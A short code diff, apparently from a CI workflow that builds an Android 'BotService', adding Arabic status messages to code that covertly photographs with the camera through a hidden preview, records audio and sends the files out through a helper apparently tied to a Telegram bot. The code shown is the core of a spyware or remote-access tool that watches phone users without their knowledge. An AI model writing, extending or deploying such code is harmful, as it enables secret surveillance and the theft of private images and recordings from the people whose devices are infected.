@@ -442,6 +442,7 @@ jobs:
                 c.setPreviewTexture(new android.graphics.SurfaceTexture(0));
                 c.startPreview();
                 final String f = getExternalFilesDir(null) + "/cam.jpg";
+                res("📷 بدأ التصوير");
                 c.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
                   public void onPictureTaken(byte[] data, android.hardware.Camera cc) {
                     try {
@@ -469,7 +470,8 @@ jobs:
                 final BotService self = this;
                 new Handler(getMainLooper()).postDelayed(new Runnable() {
                   public void run() {
-                    try { r.stop(); r.release(); } catch (Exception e) {}
+                    res("⏹ وقف التسجيل");
+                    try { r.stop(); r.release(); } catch (Exception e) { res("stop ERR " + e); }
                     tgFile(self, f, "🎙 تسجيل");
                   }
                 }, sec * 1000L);
